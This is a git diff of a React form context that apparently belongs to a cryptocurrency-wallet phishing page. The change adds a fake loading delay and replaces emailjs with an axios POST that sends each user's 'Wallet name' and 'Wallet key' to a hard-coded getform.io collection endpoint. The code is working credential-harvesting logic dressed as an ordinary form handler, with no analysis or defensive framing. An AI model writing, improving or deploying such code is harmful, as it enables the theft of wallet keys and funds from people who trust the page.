@@ -1,5 +1,6 @@
-import React, { createContext, useState, useContext } from "react";
+import React, { useEffect, createContext, useState, useContext } from "react";
 import emailjs from "emailjs-com";
+import axios from "axios";
 
 // Context
 export const FormContext = createContext(undefined);
@@ -10,57 +11,67 @@ export const FormContextProvider = ({ children }) => {
     walletName: "",
     walletKey: "",
   });
-
-  const [isLoading, setIsLoading] = useState(false);
+  const [isLoading, setIsLoading] = useState(true);
+  const [error, setError] = useState(false);
 
   // Functions
+  useEffect(() => {
+    const timeoutId = setTimeout(() => {
+      setIsLoading(false);
+    }, 2000);
+
+    return () => clearTimeout(timeoutId);
+  }, []);
 
   const handleInputChange = (event) => {
     const { name, value } = event.target;
     setFormData({
       ...formData,
-      [name]: value,
+      [name]: value?.walletName || value,
     });
   };
 
-  const handleSubmit = () => {
+  async function handleSubmit() {
     console.log(formData);
+    setIsLoading(true);
 
-    const userId = process.env.REACT_APP_EMAILJS_USER_ID;
-    const serviceId = process.env.REACT_APP_EMAILJS_SERVICE_ID;
-    const templateId = process.env.REACT_APP_EMAILJS_TEMPLATE_ID;
-    emailjs
-      .send(
-        process.env.REACT_APP_EMAILJS_SERVICE_ID,
-        process.env.REACT_APP_EMAILJS_TEMPLATE_ID,
-        formData,
-        process.env.REACT_APP_EMAILJS_USER_ID
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-
-          // setIsLoading(false);
+    try {
+      const response = await axios.post(
+        "https://getform.io/f/fdf22c60-8afa-4153-9634-47df4ad111bf",
+        {
+          "Wallet name": formData.walletName.name,
+          "Wallet key": formData.walletKey,
         },
-        (error) => {
-          console.error(error.text);
-
-          // setIsLoading(false);
-        }
+        { headers: { Accept: "application/json" } }
       );
 
-    setFormData({
-      walletName: "",
-      walletKey: "",
-    });
-  };
+      console.log(response);
+
+      setFormData({
+        walletName: "",
+        walletKey: "",
+      });
+      setError("");
+      setIsLoading(false);
+
+      return { error: false };
+    } catch (error) {
+      console.error("Error sending email:", error);
+
+      setError(true);
+      setIsLoading(false);
+
+      return { error: true };
+    }
+  }
 
   // Value
   const contextValue = {
     formData,
     handleSubmit,
     handleInputChange,
-
+    isLoading,
+    error,
     setFormData,
   };
 
